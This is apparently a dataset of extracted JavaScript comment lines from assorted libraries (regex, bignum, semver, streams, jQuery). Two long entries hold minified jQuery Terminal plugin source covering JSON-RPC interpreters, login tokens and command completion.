"// '\u' (char #92, char #117) denotes an escaped character."
"// '`', '${'"
"// 'a=b,c'"
"// 'async', 'get', 'set', or 'static' were not a keyword contextually."
"// 'atomic', nondivisible expression types at the bottom. Most of"
"// 'button' },"
"// 'error-handler': [],"
"// 'foo' chunk flows to dest1 immediately, and is gone"
"// 'getCats' has signature (callback(err, data))"
"// 'informix': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'msTransform' is correct, but the other prefixes should be capitalized"
"// 'mssql': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'mysqli': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'oracle': ['UTF8','ZHS16GBK','ZHT16BIG5','ZHS16GBKFIXED','ZHT16BIG5FIXED'],"
"// 'oracle_oci8': ['UTF8','ZHS16GBK','ZHT16BIG5','ZHS16GBKFIXED','ZHT16BIG5FIXED'],"
"// 'postgresql': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'postgresql_pdo': ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'],"
"// 'schema-location': [],"
"// 'schema-type': [],"
"// 'sqlite_pdo': ['utf8'],"
"// 'sqlsrv': ['utf-8', 'char'],"
"// '{""a"":0,""b"":1,""o"":""[Circular]""}'"
"// '{""a"":1,""o"":""[Circular]""}'"
"// '{""b"":1,""a"":0,""o"":""[Circular]""}'"
"// '{""version"":3,""file"":""source-mapped.js"",""sources"":[""foo.js""],""names"":[""christopher""],""mappings"":"";;;;;;;;;mCAgCEA""}'"
"// '{""version"":3,""sources"":[""module-one.scm""],""names"":[],""mappings"":""...snip..."",""file"":""my-generated-javascript-file.js"",""sourceRoot"":""http://example.com/app/js/""}'"
"// ( namespace ) or ( selector, types [, fn] )"
"// ( types [, fn] )"
"// ( types, data, fn )"
"// ( types, fn )"
"// ( types, selector, fn )"
"// ( types-Object, data )"
"// ( types-Object, selector, data )"
"// ( types-object [, selector] )"
"// (""."") character."""
"// (#7102#comment:10, https://github.com/jquery/jquery/pull/557)"
"// (1 / +0|0) -> Infinity, but (1 / -0) -> -Infinity and (Infinity !== -Infinity)"
"// (100-nanoseconds offset from msecs) since unix epoch, 1970-01-01 00:00."
"// (1582-10-15 00:00).  JSNumbers aren't precise enough for this, so"
"// (2019), 11 (2020), 12 (2021), 13 (2022), or `""latest""` (the"
"// (?!) should work like \b\B, but is unreliable in Firefox"
"// (Also, check header.needPax to see if it needs a pax header.)"
"// (They are awkward, and in ES6 every block can be a scope.)"
"// (a,b) ': {"
"// (a,b)': {"
"// (although not necessarily the same order), equivalent values for every"
"// (because it's a hardlink, or because unlink:true is set, or it's"
"// (excepting DocumentFragment context, where the methods don't exist)"
"// (function(){ ... }()); does not need to be reprinted, even though"
"// (here, the decorated node) so that it includes node.decorators."
"// (here, the export declaration) so that it includes node.decorators."
"// (i.e. intervals of 100, 200, 400, 800, 1600, ... milliseconds)"
"// (id, class & pseudo-class)"
"// (if this implementation detail changes, this method will still"
"// (including the %x3B ("";"") in question)."" plus later on in the same section"
"// (like openingElement, closingElement, and children) are"
"// (octets will be different, every time)"
"// (protected) divide this by m, quotient and remainder to q, r (HAC 14.20)"
"// (protected) r = ""this * a"" without lower n words, n > 0"
"// (protected) r = lower n words of ""this * a"", a.t <= n"
"// (protected) r = this * a, r != this,a (HAC 14.12)"
"// (protected) r = this^2, r != this (HAC 14.16)"
"// (protected) return ""-1/this % 2^DB""; useful for Mont. reduction"
"// (protected) set from integer value x, -DV <= x < DV"
"// (protected) this % n, n < 2^26"
"// (protected) this *= n, this >= 0, 1 < n < DV"
"// (protected) this += n << w words, this >= 0"
"// (protected) this^e, e < 2^32, doing sqr and mul with ""r"" (HAC 14.79)"
"// (protected) true if probably prime (HAC 4.24, Miller-Rabin)"
"// (public) 0 if this == 0, 1 if this > 0"
"// (public) [this/a,this%a]"
"// (public) gcd(this,a) (HAC 14.54)"
"// (public) return + if this > a, - if this < a, 0 if equal"
"// (public) return the number of bits in ""this"""
"// (public) this^e % m, 0 <= e < 2^32"
"// (second clause tests for Object.defineProperty() in IE<9 that only supports extending DOM prototypes, but"
"// (setItem('foo', undefined) will return `null`), but"
"// (static pages), we can simply return the text as it is."
"// * match all (empty block, do not remove)"
"// *** negation, user action and target pseudo-classes"
"// **Reduce** builds up a single result from a list of values, aka `inject`,"
"// , comma"
"// - Any object or value whose internal [[Class]] property is not ""[object Object]"""
"// - Check duplicate argument names, if checkClashes is set."
"// - Every simple range `r1, r2, ...` is a null set, OR"
"// - Every simple range `r1, r2, ...` which is not a null set is a subset of"
"// - If EQ is more than one, return true (null set)"
"// - If GT and LT, and GT.semver > LT.semver, return true (null set)"
"// - If any C is a = range, and GT or LT are set, return false"
"// - Less-used features of style: disabled, scoped, title"
"// - Load events are not in the specs, but apparently some browsers"
"// - No data in the buffer, and the stream is in flowing mode. In this mode"
"// - abort otherwise,"
"// -> 'Smith, John'"
"// -> ['..', 'word', '1', '..']"
"// -> ['1', '<<2>>', '3']"
"// -> ['2', '4', '56']"
"// -> ['a', 'ab']"
"// -> ['a', 'b', 'c']"
"// -> ['a', 'b']"
"// -> ['t((e))s', '', 'ing']"
"// -> ['xregexp.com', 'www.google.com']"
"// -> [2, 4]"
"// ... except it avoids using URL, which wasn't available in the"
"// ... using predefined URL namespace (for, well, URLs)"
"// ...but misinterprets leading-number strings, particularly hex literals (""0x..."")"
"// .M, this is fine .\^/M.."
"// .get() because push.apply(_, arraylike) throws"
"// .params() calls .flush(), but the latter is always async in the"
"// .precedingNode, .enclosingNode, and/or .followingNode properties, at"
"// .set('Content-Type', 'application/x-www-form-urlencoded')"
"// / // / _  / _/ // / / / _  / _/     / /  \\/ / _ \\/ /"",""/  / / // / // / ___/ // // / / / ___/ // / / / / /\\  / // / /__"",""\\___/____ \\\\__/____/_/ \\__ / /_/____/_//_/ /_/ /_/  \\/\\__\\_\\___/"",""         \\/          /____/                                   "".replace(reg,"" "")+version_string,copyright],[""      __ _____                     ________                              __"",""     / // _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___  / /"","" __ / // // // // // _  // _// // / / // _  // _//     // //  \\/ // _ \\/ /"",""/  / // // // // // ___// / / // / / // ___// / / / / // // /\\  // // / /__"",""\\___//____ \\\\___//____//_/ _\\_  / /_//____//_/ /_/ /_//_//_/ /_/ \\__\\_\\___/"",""          \\/              /____/                                          "".replace(reg,"""")+version_string,copyright]];$.terminal.defaults={prompt:""> "",history:true,exit:true,clear:true,enabled:true,historySize:60,checkArity:true,exceptionHandler:null,cancelableAjax:true,processArguments:true,linksNoReferrer:false,login:null,outputLimit:-1,onAjaxError:null,onRPCError:null,completion:false,historyFilter:null,onInit:$.noop,onClear:$.noop,onBlur:$.noop,onFocus:$.noop,onTerminalChange:$.noop,onExit:$.noop,keypress:$.noop,keydown:$.noop,strings:{wrongPasswordTryAgain:""Wrong password try again!"",wrongPassword:""Wrong password!"",ajaxAbortError:""Error while aborting ajax call!"",wrongArity:""Wrong number of arguments. Function '%s' expect %s got %s!"",commandNotFound:""Command '%s' Not Found!"",oneRPCWithIgnore:""You can use only one rpc with ignoreSystemDescribe"",oneInterpreterFunction:""You can't use more then one function (rpc with ""+""ignoreSystemDescribe is count as one)"",loginFunctionMissing:""You don't have login function"",noTokenError:""Access denied (no token)"",serverResponse:""Server reponse is"",wrongGreetings:""Wrong value of greetings parameter"",notWhileLogin:""You can't call that function while in login"",loginIsNotAFunction:""Authenticate must be a function"",canExitError:""You can't exit from main interpeter"",invalidCompletion:""Invalid completion"",login:""login"",password:""password""}};var requests=[];var terminals=new Cycle;$.fn.terminal=function(init_interpreter,options){function get_processed_command(command){if(typeof settings.processArguments===""function""){return processCommand(command,settings.processArguments)}else if(settings.processArguments){return $.terminal.parseCommand(command)}else{return $.terminal.splitCommand(command)}}function display_object(object){if(typeof object===""string""){self.echo(object)}else if(object instanceof Array){self.echo($.map(object,function(object){return $.json_stringify(object)}).join("" ""))}else if(typeof object===""object""){self.echo($.json_stringify(object))}else{self.echo(object)}}function display_json_rpc_error(error){if(typeof settings.onRPCError===""function""){settings.onRPCError.call(self,error)}else{self.error(""&#91;RPC&#93; ""+error.message)}}function make_basic_json_rpc_interpreter(url){var service=function(method,params){self.pause();$.jrpc(url,method,params,function(json){if(!json.error){if(typeof settings.processRPCResponse===""function""){settings.processRPCResponse.call(self,json.result)}else{display_object(json.result)}}else{display_json_rpc_error(json.error)}self.resume()},ajax_error)};return function(command,terminal){if(command===""""){return}command=get_processed_command(command);if(!settings.login||command.name===""help""){service(command.name,command.args)}else{var token=terminal.token();if(token){service(command.name,[token].concat(command.args))}else{terminal.error(""&#91;AUTH&#93; ""+strings.noTokenError)}}}}function make_object_interpreter(object,arity,fallback){return function(user_command,terminal){if(user_command===""""){return}var command=get_processed_command(user_command);var val=object[command.name];var type=$.type(val);if(type===""function""){if(arity&&val.length!==command.args.length){self.error(""&#91;Arity&#93; ""+sprintf(strings.wrongArity,command.name,val.length,command.args.length))}else{return val.apply(self,command.args)}}else if(type===""object""||type===""string""){var commands=[];if(type===""object""){commands=Object.keys(val);val=make_object_interpreter(val,arity)}terminal.push(val,{prompt:command.name+""> "",name:command.name,completion:type===""object""?function(term,string,callback){callback(commands)}:undefined})}else{if($.type(fallback)===""function""){fallback(user_command,self)}else if($.type(settings.onCommandNotFound)===""function""){settings.onCommandNotFound(user_command,self)}else{terminal.error(sprintf(strings.commandNotFound,command.name))}}}}function ajax_error(xhr,status,error){self.resume();if(typeof settings.onAjaxError==""function""){settings.onAjaxError.call(self,xhr,status,error)}else if(status!==""abort""){self.error(""&#91;AJAX&#93; ""+status+"" - ""+strings.serverResponse+"": \n""+xhr.responseText)}}function make_json_rpc_object(url,auth,success){$.jrpc(url,""system.describe"",[],function(ret){var commands=[];if(ret.procs){var interpreter_object={};$.each(ret.procs,function(_,proc){interpreter_object[proc.name]=function(){var append=auth&&proc.name!=""help"";var args=Array.prototype.slice.call(arguments);var args_len=args.length+(append?1:0);if(settings.checkArity&&proc.params&&proc.params.length!==args_len){self.error(""&#91;Arity&#93; ""+sprintf(strings.wrongArity,proc.name,proc.params.length,args_len))}else{self.pause();if(append){args=[self.token(true)].concat(args)}$.jrpc(url,proc.name,args,function(json){if(json.error){display_json_rpc_error(json.error)}else{display_object(json.result)}self.resume()},ajax_error)}}});success(interpreter_object)}else{success(null)}},function(){success(null)})}function make_interpreter(user_interpreter,auth,finalize){finalize=finalize||$.noop;var type=$.type(user_interpreter);var result={};var commands;var rpc_count=0;var function_interpreter;if(type===""array""){var object={};(function recur(interpreters,success){if(interpreters.length){var first=interpreters[0];var rest=interpreters.slice(1);var type=$.type(first);if(type===""string""){rpc_count++;self.pause();if(settings.ignoreSystemDescribe){if(rpc_count===1){function_interpreter=make_basic_json_rpc_interpreter(first)}else{self.error(strings.oneRPCWithIgnore)}recur(rest,success)}else{make_json_rpc_object(first,auth,function(new_object){if(new_object){$.extend(object,new_object)}self.resume();recur(rest,success)})}}else if(type===""function""){if(function_interpreter){self.error(strings.oneInterpreterFunction)}else{function_interpreter=first}}else if(type===""object""){$.extend(object,first);recur(rest,success)}}else{success()}})(user_interpreter,function(){commands=Object.keys(object);result.interpreter=make_object_interpreter(object,false,function_interpreter);result.completion=function(term,string,callback){callback(commands)};finalize(result)})}else if(type===""string""){if(settings.ignoreSystemDescribe){finalize({interpreter:make_basic_json_rpc_interpreter(user_interpreter),completion:settings.completion})}else{self.pause();make_json_rpc_object(user_interpreter,auth,function(object){if(object){var commands=Object.keys(object);result.interpreter=make_object_interpreter(object,false);result.completion=function(term,string,callback){callback(commands)}}else{result.interpreter=make_basic_json_rpc_interpreter(user_interpreter);result.completion=settings.completion}self.resume();finalize(result)})}}else if(type===""object""){commands=Object.keys(user_interpreter);result.interpreter=make_object_interpreter(user_interpreter,settings.checkArity);result.completion=function(term,string,callback){callback(commands)};finalize(result)}else{if(type===""undefined""){user_interpreter=$.noop}else if(type!==""function""){throw type+"" is invalid interpreter value""}finalize({interpreter:user_interpreter,completion:settings.completion})}}function make_json_rpc_login(url,login){var method=$.type(login)===""boolean""?""login"":login;return function(user,passwd,callback,term){self.pause();$.jrpc(url,method,[user,passwd],function(response){self.resume();if(!response.error&&response.result){callback(response.result)}else{callback(null)}},ajax_error)}}function exception_message(e){if(typeof e===""string""){return e}else if(typeof e.fileName===""string""){return e.fileName+"": ""+e.message}else{return e.message}}function display_exception(e,label){if(typeof settings.exceptionHandler==""function""){settings.exceptionHandler.call(self,e)}else{self.exception(e,label)}}function scroll_to_bottom(){var scrollHeight=scroll_object.prop?scroll_object.prop(""scrollHeight""):scroll_object.attr(""scrollHeight"");scroll_object.scrollTop(scrollHeight)}function validate(label,object){try{if(typeof object===""function""){object(function(){})}else if(typeof object!==""string""){var msg=label+"" must be string or function"";throw msg}}catch(e){display_exception(e,label.toUpperCase());return false}return true}var output_buffer=[];var NEW_LINE=1;function draw_line(string,options){try{var line_settings=$.extend({raw:false,finalize:$.noop},options||{});string=$.type(string)===""function""?string():string;string=$.type(string)===""string""?string:String(string);var i,len;if(!line_settings.raw){string=$.terminal.encode(string)}string=$.terminal.overtyping(string);string=$.terminal.from_ansi(string);output_buffer.push(NEW_LINE);if(!line_settings.raw&&(string.length>num_chars||string.match(/\n/))){var array=$.terminal.split_equal(string,num_chars);for(i=0,len=array.length;i<len;++i){if(array[i]===""""||array[i]===""\r""){output_buffer.push(""&nbsp;"")}else{if(line_settings.raw){output_buffer.push(array[i])}else{output_buffer.push($.terminal.format(array[i],{linksNoReferer:settings.linksNoReferer}))}}}}else{if(!line_settings.raw){string=$.terminal.format(string,{linksNoReferer:settings.linksNoReferer})}output_buffer.push(string)}output_buffer.push(line_settings.finalize)}catch(e){output_buffer=[];alert(""[Internal Exception(draw_line)]:""+exception_message(e)+""\n""+e.stack)}}function redraw(){command_line.resize(num_chars);var o=output.empty().detach();var lines_to_show;if(settings.outputLimit>=0){var limit=settings.outputLimit===0?self.rows():settings.outputLimit;lines_to_show=lines.slice(lines.length-limit-1)}else{lines_to_show=lines}$.each(lines_to_show,function(i,line){draw_line.apply(null,line)});command_line.before(o);self.flush()}function show_greetings(){if(settings.greetings===undefined){self.echo(self.signature)}else if(settings.greetings){var type=typeof settings.greetings;if(type===""string""){self.echo(settings.greetings)}else if(type===""function""){settings.greetings.call(self,self.echo)}else{self.error(strings.wrongGreetings)}}}function echo_command(command){command=$.terminal.escape_brackets($.terminal.encode(command,true));var prompt=command_line.prompt();if(command_line.mask()){command=command.replace(/./g,""*"")}if(typeof prompt===""function""){prompt(function(string){self.echo(string+command)})}else{self.echo(prompt+command)}}function commands(command,silent,exec){try{if(!ghost()){prev_command=$.terminal.splitCommand(command).name;if(exec&&typeof settings.historyFilter==""function""&&settings.historyFilter(command)||!settings.historyFilter){command_line.history().append(command)}}var interpreter=interpreters.top();if(command===""exit""&&settings.exit){var count=interpreters.size();self.token();if(count==1&&self.token()||count>1){if(!silent){echo_command(command)}self.pop()}}else{if(!silent){echo_command(command)}var position=lines.length-1;if(command===""clear""&&settings.clear){self.clear()}else{var result=interpreter.interpreter(command,self);if(result!==undefined){if(position===lines.length-1){lines.pop();if(result!==false){self.echo(result)}}else{if(result===false){lines=lines.slice(0,position).concat(lines.slice(position+1))}else{lines=lines.slice(0,position).concat([result]).concat(lines.slice(position+1))}}self.resize()}}}}catch(e){display_exception(e,""USER"");self.resume();throw e}}function global_logout(){if(typeof settings.onBeforeLogout===""function""){try{if(settings.onBeforeLogout(self)===false){return}}catch(e){display_exception(e,""onBeforeLogout"");throw e}}logout();if(typeof settings.onAfterLogout===""function""){try{settings.onAfterLogout(self)}catch(e){display_exception(e,""onAfterlogout"");throw e}}self.login(settings.login,true,initialize)}function logout(){var name=self.prefix_name(true)+""_"";$.Storage.remove(name+""token"");$.Storage.remove(name+""login"")}function maybe_append_name(interpreter_name){var storage_key=self.prefix_name()+""_interpreters"";var names=$.Storage.get(storage_key);if(names){names=$.parseJSON(names)}else{names=[]}if($.inArray(interpreter_name,names)==-1){names.push(interpreter_name);$.Storage.set(storage_key,$.json_stringify(names))}}function prepare_top_interpreter(silent){var interpreter=interpreters.top();var name=self.prefix_name(true);if(!ghost()){maybe_append_name(name)}command_line.name(name);if(typeof interpreter.prompt==""function""){command_line.prompt(function(command){interpreter.prompt(command,self)})}else{command_line.prompt(interpreter.prompt)}command_line.set("""");if(!silent&&typeof interpreter.onStart===""function""){interpreter.onStart(self)}}function initialize(){prepare_top_interpreter();show_greetings();var was_paused=false;if(typeof settings.onInit===""function""){onPause=function(){was_paused=true};try{settings.onInit(self)}catch(e){display_exception(e,""OnInit"");throw e}finally{onPause=$.noop;if(!was_paused){self.resume()}}}}function complete_helper(command,string,commands){var test=command_line.get().substring(0,command_line.position());if(test!==command){return}var regex=new RegExp(""^""+$.terminal.escape_regex(string));var matched=[];for(var i=commands.length;i--;){if(regex.test(commands[i])){matched.push(commands[i])}}if(matched.length===1){self.insert(matched[0].replace(regex,"""")+"" "")}else if(matched.length>1){if(tab_count>=2){echo_command(command);self.echo(matched.join(""	""));tab_count=0}else{var found=false;var found_index;var j;loop:for(j=string.length;j<matched[0].length;++j){for(i=1;i<matched.length;++i){if(matched[0].charAt(j)!==matched[i].charAt(j)){break loop}}found=true}if(found){self.insert(matched[0].slice(0,j).replace(regex,""""))}}}}function ghost(){return in_login||command_line.mask()}function key_down(e){var result,i,top=interpreters.top();if($.type(top.keydown)===""function""){result=top.keydown(e,self);if(result!==undefined){return result}}var completion;if(settings.completion&&$.type(settings.completion)!=""boolean""&&!top.completion){completion=settings.completion}else{completion=top.completion}self.oneTime(10,function(){on_scrollbar_show_resize()});if($.type(settings.keydown)===""function""){result=settings.keydown(e,self);if(result!==undefined){return result}}if(!self.paused()){if(e.which!==9){tab_count=0}if(e.which===68&&e.ctrlKey){if(!in_login){if(command_line.get()===""""){if(interpreters.size()>1||settings.login!==undefined){self.pop("""")}else{self.resume();self.echo("""")}}else{self.set_command("""")}}return false}else if(e.which===76&&e.ctrlKey){self.clear()}else if(completion&&e.which===9){++tab_count;var command=command_line.get().substring(0,command_line.position());var strings=command.split("" "");var string;if(strings.length==1){string=strings[0]}else{string=strings[strings.length-1];for(i=strings.length-1;i>0;i--){if(strings[i-1][strings[i-1].length-1]==""\\""){string=strings[i-1]+"" ""+string}else{break}}}switch($.type(completion)){case""function"":completion(self,string,function(commands){complete_helper(command,string,commands)});break;case""array"":complete_helper(command,string,completion);break;default:throw new Error($.terminal.defaults.strings.invalidCompletion)}return false}else if(e.which===86&&e.ctrlKey){self.oneTime(1,function(){scroll_to_bottom()});return}else if(e.which===9&&e.ctrlKey){if(terminals.length()>1){self.focus(false);return false}}else if(e.which===34){self.scroll(self.height())}else if(e.which===33){self.scroll(-self.height())}else{self.attr({scrollTop:self.attr(""scrollHeight"")})}}else if(e.which===68&&e.ctrlKey){if(requests.length){for(i=requests.length;i--;){var r=requests[i];if(4!==r.readyState){try{r.abort()}catch(error){self.error(strings.ajaxAbortError)}}}requests=[];self.resume()}return false}}var self=this;if(this.length>1){return this.each(function(){$.fn.terminal.call($(this),init_interpreter,$.extend({name:self.selector},options))})}else{if(self.data(""terminal"")){return self.data(""terminal"")}if(self.length===0){throw'Sorry, but terminal said that ""'+self.selector+'"" is not valid selector!'}var scroll_object;var prev_command;var loged_in=false;var tab_count=0;var lines=[];var output;var terminal_id=terminals.length();var num_chars;var num_rows;var command_list=[];var url;var in_login=false;var onPause=$.noop;var old_width,old_height;var dalyed_commands=[];var settings=$.extend({},$.terminal.defaults,{name:self.selector},options||{});var strings=$.terminal.defaults.strings;var enabled=settings.enabled;var paused=false;$.extend(self,$.omap({clear:function(){output.html("""");command_line.set("""");lines=[];try{settings.onClear(self)}catch(e){display_exception(e,""onClear"");throw e}self.attr({scrollTop:0});return self},export_view:function(){if(in_login){throw new Exception(strings.notWhileLogin)}return{prompt:self.get_prompt(),command:self.get_command(),position:command_line.position(),lines:lines.slice(0)}"
"// / // / _  / _/ // / / / _  / _/     / /  \\/ / _ \\/ /"",""/  / / // / // / ___/ // // / / / ___/ // / / / / /\\  / // / /__"",""\\___/____ \\\\__/____/_/ \\__ / /_/____/_//_/_/_/ /_/  \\/\\__\\_\\___/"",""         \\/          /____/                                   "".replace(Y,"" "")+G,J],[""      __ _____                     ________                            ""+""  __"",""     / // _  /__ __ _____ ___ __ _/__  ___/__ ___ ______ __ __  __ ___ ""+"" / /"","" __ / // // // // // _  // _// // / / // _  // _//     // //  \\/ // _ ""+""\\/ /"",""/  / // // // // // ___// / / // / / // ___// / / / / // // /\\  // // ""+""/ /__"",""\\___//____ \\\\___//____//_/ _\\_  / /_//____//_/ /_/ /_//_//_/ /_/ \\""+""__\\_\\___/"",(""          \\/              /____/                                      ""+""    "").replace(Y,"""")+G,J]];e.terminal.defaults={prompt:""> "",history:true,exit:true,clear:true,enabled:true,historySize:60,maskChar:""*"",wrap:true,checkArity:true,raw:false,exceptionHandler:null,pauseEvents:true,memory:false,cancelableAjax:true,processArguments:true,linksNoReferrer:false,processRPCResponse:null,Token:true,convertLinks:true,extra:{},historyState:false,importHistory:false,echoCommand:true,scrollOnEcho:true,login:null,outputLimit:-1,formatters:[],onAjaxError:null,scrollBottomOffset:20,wordAutocomplete:true,clickTimeout:200,request:e.noop,response:e.noop,onRPCError:null,completion:false,historyFilter:null,softPause:false,onInit:e.noop,onClear:e.noop,onBlur:e.noop,onFocus:e.noop,onTerminalChange:e.noop,onExit:e.noop,onPush:e.noop,onPop:e.noop,keypress:e.noop,keydown:e.noop,strings:{comletionParameters:""From version 1.0.0 completion function need to""+"" have two arguments"",wrongPasswordTryAgain:""Wrong password try again!"",wrongPassword:""Wrong password!"",ajaxAbortError:""Error while aborting ajax call!"",wrongArity:""Wrong number of arguments. Function '%s' expects %s got""+"" %s!"",commandNotFound:""Command '%s' Not Found!"",oneRPCWithIgnore:""You can use only one rpc with ignoreSystemDescr""+""ibe or rpc without system.describe"",oneInterpreterFunction:""You can't use more than one function (rpc ""+""without system.describe or with option ignoreSystemDescribe cou""+""nts as one)"",loginFunctionMissing:""You didn't specify a login function"",noTokenError:""Access denied (no token)"",serverResponse:""Server responded"",wrongGreetings:""Wrong value of greetings parameter"",notWhileLogin:""You can't call `%s' function while in login"",loginIsNotAFunction:""Authenticate must be a function"",canExitError:""You can't exit from main interpreter"",invalidCompletion:""Invalid completion"",invalidSelector:'Sorry, but terminal said that ""%s"" is not valid '+""selector!"",invalidTerminalId:""Invalid Terminal ID"",login:""login"",password:""password"",recursiveCall:""Recursive call detected, skip"",notAString:""%s function: argument is not a string"",redrawError:""Internal error, wrong position in cmd redraw""}};var Q=[];var Z=new h;var ee=[];var ne;var te=false;var re=true;var ie=true;e.fn.terminal=function(t,i){function o(n){if(n){this.storage={}}this.set=function(t,r){if(n){this.storage[t]=r}else{e.Storage.set(t,r)}};this.get=function(t){if(n){return this.storage[t]}else{return e.Storage.get(t)}};this.remove=function(t){if(n){delete this.storage[t]}else{e.Storage.remove(t)}}}function a(n){if(e.isFunction(Ce.processArguments)){return b(n,Ce.processArguments)}else if(Ce.processArguments){return e.terminal.parse_command(n)}else{return e.terminal.split_command(n)}}function s(n){if(typeof n===""string""){se.echo(n)}else if(n instanceof Array){se.echo(e.map(n,function(e){return JSON.stringify(e)}).join("" ""))}else if(typeof n===""object""){se.echo(JSON.stringify(n))}else{se.echo(n)}}function l(n){var t=/(.*):([0-9]+):([0-9]+)$/;var r=n.match(t);if(r){se.pause(Ce.softPause);e.get(r[1],function(n){var t=location.href.replace(/[^\/]+$/,"""");var i=r[1].replace(t,"""");se.echo(""[[b;white;]""+i+""]"");var o=n.split(""\n"");var a=+r[2]-1;se.echo(o.slice(a-2,a+3).map(function(n,t){if(t===2){n=""[[;#f00;]""+e.terminal.escape_brackets(n)+""]""}return""[""+(a+t)+""]: ""+n}).join(""\n"")).resume()},""text"")}}function f(n){if(e.isFunction(Ce.onRPCError)){Ce.onRPCError.call(se,n)}else{se.error(""&#91;RPC&#93; ""+n.message);if(n.error&&n.error.message){n=n.error;var t=""    ""+n.message;if(n.file){t+=' in file ""'+n.file.replace(/.*\//,"""")+'""'}if(n.at){t+="" at line ""+n.at}se.error(t)}}}function c(n,t){var r=function(t,r){se.pause(Ce.softPause);e.jrpc({url:n,method:t,params:r,request:function(e,n){try{Ce.request.apply(se,e,n,se)}catch(t){y(t,""USER"")}},response:function(e,n){try{Ce.response.apply(se,e,n,se)}catch(t){y(t,""USER"")}},success:function(n){if(n.error){f(n.error)}else if(e.isFunction(Ce.processRPCResponse)){Ce.processRPCResponse.call(se,n.result,se)}else{s(n.result)}se.resume()},error:p})};return function(e,n){if(e===""""){return}try{e=a(e)}catch(i){y(i,""TERMINAL (get_processed_command)"");return}if(!t||e.name===""help""){r(e.name,e.args)}else{var o=n.token();if(o){r(e.name,[o].concat(e.args))}else{n.error(""&#91;AUTH&#93; ""+Ae.noTokenError)}}}}function u(t,r,i,o){return function(s,l){if(s===""""){return}var f;try{f=a(s)}catch(c){if(e.isFunction(Ce.exception)){Ce.exception(c,se)}else{se.error(c.toString())}return}var p=t[f.name];var m=e.type(p);if(m===""function""){if(r&&p.length!==f.args.length){se.error(""&#91;Arity&#93; ""+sprintf(Ae.wrongArity,f.name,p.length,f.args.length))}else{return p.apply(se,f.args)}}else if(m===""object""||m===""string""){var h=[];if(m===""object""){h=Object.keys(p);p=u(p,r,i)}l.push(p,{prompt:f.name+""> "",name:f.name,completion:m===""object""?h:n})}else if(e.isFunction(o)){o(s,se)}else if(e.isFunction(Ce.onCommandNotFound)){Ce.onCommandNotFound.call(se,s,se)}else{l.error(sprintf(Ae.commandNotFound,f.name))}}}function p(n,t,r){se.resume();if(e.isFunction(Ce.onAjaxError)){Ce.onAjaxError.call(se,n,t,r)}else if(t!==""abort""){se.error(""&#91;AJAX&#93; ""+t+"" - ""+Ae.serverResponse+"":\n""+e.terminal.escape_brackets(n.responseText))}}function m(n,t,r){function i(n){if(n.error){f(n.error)}else if(e.isFunction(Ce.processRPCResponse)){Ce.processRPCResponse.call(se,n.result,se)}else{s(n.result)}se.resume()}function o(e,n){try{Ce.request.call(se,e,n,se)}catch(t){y(t,""USER"")}}function a(e,n){try{Ce.response.call(se,e,n,se)}catch(t){y(t,""USER"")}}function l(s){if(s.procs){var l={};e.each(s.procs,function(r,s){l[s.name]=function(){var r=t&&s.name!==""help"";var l=Array.prototype.slice.call(arguments);var f=l.length+(r?1:0);if(Ce.checkArity&&s.params&&s.params.length!==f){se.error(""&#91;Arity&#93; ""+sprintf(Ae.wrongArity,s.name,s.params.length,f))}else{se.pause(Ce.softPause);if(r){var c=se.token(true);if(c){l=[c].concat(l)}else{se.error(""&#91;AUTH&#93; ""+Ae.noTokenError)}}e.jrpc({url:n,method:s.name,params:l,request:o,response:a,success:i,error:p})}}});l.help=l.help||function(n){if(typeof n===""undefined""){var t=s.procs.map(function(e){return e.name}).join("", "")+"", help"";se.echo(""Available commands: ""+t)}else{var r=false;e.each(s.procs,function(e,t){if(t.name===n){r=true;var i="""";i+=""[[bu;#fff;]""+t.name+""]"";if(t.params){i+="" ""+t.params.join("" "")}if(t.help){i+=""\n""+t.help}se.echo(i);return false}});if(!r){if(n===""help""){se.echo(""[[bu;#fff;]help] [method]\ndisplay help ""+""for the method or list of methods if not""+"" specified"")}else{var i=""Method `""+n+""' not found "";se.error(i)}}}};r(l)}else{r(null)}}return e.jrpc({url:n,method:""system.describe"",params:[],success:l,request:function(e,n){try{Ce.request.call(se,e,n,se)}catch(t){y(t,""USER"")}},response:function(e,n){try{Ce.response.call(se,e,n,se)}catch(t){y(t,""USER"")}},error:function(){r(null)}})}function h(n,t,r){r=r||e.noop;var i=e.type(n);var o;var a={};var s=0;var l;if(i===""array""){o={};(function f(n,r){if(n.length){var i=n[0];var a=n.slice(1);var u=e.type(i);if(u===""string""){se.pause(Ce.softPause);if(Ce.ignoreSystemDescribe){if(++s===1){l=c(i,t)}else{se.error(Ae.oneRPCWithIgnore)}f(a,r)}else{m(i,t,function(n){if(n){e.extend(o,n)}else if(++s===1){l=c(i,t)}else{se.error(Ae.oneRPCWithIgnore)}se.resume();f(a,r)})}}else if(u===""function""){if(l){se.error(Ae.oneInterpreterFunction)}else{l=i}f(a,r)}else if(u===""object""){e.extend(o,i);f(a,r)}}else{r()}})(n,function(){r({interpreter:u(o,false,t,l.bind(se)),completion:Object.keys(o)})})}else if(i===""string""){if(Ce.ignoreSystemDescribe){o={interpreter:c(n,t)};if(e.isArray(Ce.completion)){o.completion=Ce.completion}r(o)}else{se.pause(Ce.softPause);m(n,t,function(e){if(e){a.interpreter=u(e,false,t);a.completion=Object.keys(e)}else{a.interpreter=c(n,t)}r(a);se.resume()})}}else if(i===""object""){r({interpreter:u(n,Ce.checkArity),completion:Object.keys(n)})}else{if(i===""undefined""){n=e.noop}else if(i!==""function""){throw new Error(i+"" is invalid interpreter value"")}r({interpreter:n,completion:Ce.completion})}}function g(n,t){var r=e.type(t)===""boolean""?""login"":t;return 